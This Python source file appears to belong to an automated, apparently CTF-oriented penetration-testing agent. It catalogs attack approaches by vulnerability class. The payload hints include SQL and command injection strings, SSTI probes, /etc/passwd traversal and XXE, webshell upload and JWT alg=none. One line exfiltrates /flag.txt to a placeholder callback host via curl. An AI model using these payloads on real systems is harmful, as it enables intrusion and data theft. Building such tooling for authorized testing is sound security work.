from __future__ import annotations

from mimick.planner.models import ApproachTemplate

# fmt: off

APPROACH_CATALOG: dict[str, list[ApproachTemplate]] = {
    "sqli": [
        ApproachTemplate(desc="Automated SQLi scan with sqlmap (progressive levels)", tools=["sqlmap"],
            payload="Start level=2 risk=1, escalate to level=5 risk=3 with tamper scripts if blocked",
            tech_variants={"php": "tamper=space2comment,between,randomcase", "node": "tamper=charunicodeencode"}),
        ApproachTemplate(desc="Manual error-based / UNION SQLi via curl", tools=["curl"],
            payload="Test: ' OR 1=1--, ' UNION SELECT NULL--, single quote error detection"),
        ApproachTemplate(desc="Blind SQLi extraction via python_exec binary search", tools=["python_exec"],
            payload="Binary search ASCII values with boolean or time-based conditions"),
        ApproachTemplate(desc="Second-order SQLi — inject via registration, trigger via profile/export",
            tools=["python_exec", "curl"],
            payload="Register user with SQLi payload in fields, trigger via different endpoint"),
    ],
    "xss": [
        ApproachTemplate(desc="Automated reflected XSS scan with dalfox", tools=["dalfox"],
            payload="Standard mode with WAF evasion flag"),
        ApproachTemplate(desc="Manual XSS with filter bypass payloads via curl", tools=["curl"],
            payload="Event handlers (onerror, onload, onfocus), encoding bypass, tag alternatives (<img>, <svg>, <details>)"),
        ApproachTemplate(desc="DOM-based XSS via browser inspection", tools=["browser"],
            payload="Check JS sinks: innerHTML, document.write, eval, location.hash consumption"),
        ApproachTemplate(desc="Blind/stored XSS with interactsh callback", tools=["dalfox", "interactsh"],
            payload="Inject in stored fields (username, bio, comments), poll for callbacks"),
    ],
    "ssti": [
        ApproachTemplate(desc="SSTI detection with polyglot probes", tools=["curl"],
            payload="Test: {{7*7}}, ${7*7}, #{7*7}, {{7*'7'}}, {%25 print(7*7) %25}",
            tech_variants={"php": "Also try Twig: {{_self.env}}", "python": "Also try Jinja2: {{config.items()}}", "java": "Also try Freemarker: ${7*7}"}),
        ApproachTemplate(desc="SSTI RCE escalation using vuln_lookup engine-specific payloads",
            tools=["vuln_lookup", "curl"], payload="Call vuln_lookup(query='ssti') then the engine-specific subtopic for full chain"),
        ApproachTemplate(desc="Blind SSTI with OOB exfiltration via interactsh", tools=["curl", "interactsh"],
            payload="Time-based detection (sleep), then exfil via curl to callback URL"),
    ],
    "idor": [
        ApproachTemplate(desc="Sequential ID enumeration with python_exec", tools=["python_exec"],
            payload="Register 2 users, access user B's resources with user A's session. Try IDs 1-10, 0, -1"),
        ApproachTemplate(desc="Custom header / JWT claim manipulation", tools=["curl", "python_exec"],
            payload="Inspect headers (X-UserId, X-User-Id), cookies, JWT claims for ID references. Swap values"),
        ApproachTemplate(desc="HTTP method switching + parameter pollution", tools=["curl"],
            payload="If GET->403, try POST/PUT/PATCH. Try ?id=1&id=2 parameter pollution"),
    ],
    "cmd_injection": [
        ApproachTemplate(desc="Direct command injection with output observation", tools=["curl"],
            payload="Test: ;id, |id, $(id), `id`, &&id. Check response for command output"),
        ApproachTemplate(desc="Blind command injection with OOB exfiltration", tools=["curl", "interactsh"],
            payload="Use: curl http://CALLBACK/$(cat /flag.txt|base64 -w0), DNS exfil via nslookup"),
        ApproachTemplate(desc="Encoded/alternative command injection via python_exec", tools=["python_exec"],
            payload="Try: base64 encoding, $IFS for spaces, hex encoding, alternative binaries (busybox, python3 -c)"),
    ],
    "path_traversal": [
        ApproachTemplate(desc="Basic path traversal with encoding variants", tools=["curl"],
            payload="../../../../etc/passwd, ....//....//etc/passwd, ..%252f..%252f (double encode)"),
        ApproachTemplate(desc="PHP wrapper-based LFI (filter, data, input)", tools=["curl"],
            payload="php://filter/convert.base64-encode/resource=index.php, php://input with POST body",
            tech_variants={"php": "CRITICAL: PHP wrappers are the most reliable LFI technique on PHP"}),
        ApproachTemplate(desc="LFI to sensitive files and source code reading", tools=["curl", "python_exec"],
            payload="Target: /proc/self/environ, /app/.env, /flag.txt, /opt/flag.txt. Read source to find more paths"),
    ],
    "auth_bypass": [
        ApproachTemplate(desc="JWT manipulation (alg:none, role change, weak secret)", tools=["python_exec"],
            payload="Decode JWT, try alg=none, change role/admin claims, bruteforce weak secrets with PyJWT"),
        ApproachTemplate(desc="Mass assignment at registration/profile update", tools=["curl", "python_exec"],
            payload="Add role=admin, is_admin=true, admin=1 to registration/update payloads"),
        ApproachTemplate(desc="Direct admin endpoint access / 2FA bypass", tools=["curl", "browser"],
            payload="Try /admin directly, skip 2FA step, null/empty 2FA code, brute-force short codes"),
    ],
    "ssrf": [
        ApproachTemplate(desc="Direct SSRF with internal URL injection", tools=["curl"],
            payload="Inject http://127.0.0.1, http://localhost, http://169.254.169.254 in URL parameters"),
        ApproachTemplate(desc="Blind SSRF with OOB detection via interactsh", tools=["curl", "interactsh"],
            payload="Inject callback URL, poll for interactions. Try DNS rebinding if direct blocked"),
    ],
    "file_upload": [
        ApproachTemplate(desc="Malicious file upload with extension/type bypass", tools=["curl", "python_exec"],
            payload="Upload .php/.phtml/.php5 webshell, polyglot SVG with XSS, double extension (.php.jpg)"),
        ApproachTemplate(desc="Upload path traversal + IDOR to other users", tools=["python_exec"],
            payload="Manipulate filename (../../../shell.php), upload to other users' storage via IDOR"),
    ],
    "deserialization": [
        ApproachTemplate(desc="Cookie/token inspection and deserialization craft", tools=["python_exec", "curl"],
            payload="Decode all cookies (base64, URL). Look for PHP serialize (O:, a:, s:), Python pickle, YAML (!!python)"),
        ApproachTemplate(desc="Engine-specific deserialization RCE via vuln_lookup", tools=["vuln_lookup", "python_exec"],
            payload="Call vuln_lookup(query='deserialization') for PHP/Python/Java/Node gadget chains"),
    ],
    "blind_vuln": [
        ApproachTemplate(desc="Time-based blind detection across injection types", tools=["curl", "python_exec"],
            payload="Test: sleep-based SQLi, SSTI with sleep, command injection with sleep. Measure response times"),
        ApproachTemplate(desc="OOB blind detection with interactsh", tools=["interactsh", "curl"],
            payload="Inject callback URLs in all parameters, poll for DNS/HTTP interactions"),
    ],
    "xxe": [
        ApproachTemplate(desc="XXE with external entity to read files", tools=["curl"],
            payload="<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"),
        ApproachTemplate(desc="Blind XXE with OOB data exfiltration", tools=["curl", "interactsh"],
            payload="External DTD with parameter entities to exfil via HTTP/DNS callback"),
    ],
}

# fmt: on

FALLBACK_APPROACHES: list[ApproachTemplate] = [
    ApproachTemplate(
        desc="Consult vuln_lookup knowledge base for payloads and techniques",
        tools=["vuln_lookup"],
        payload="Call vuln_lookup(query='<category>') for reference payloads",
    ),
    ApproachTemplate(
        desc="Manual exploration with curl and python_exec",
        tools=["curl", "python_exec"],
        payload="Probe the endpoint manually, inspect responses, craft custom payloads",
    ),
]
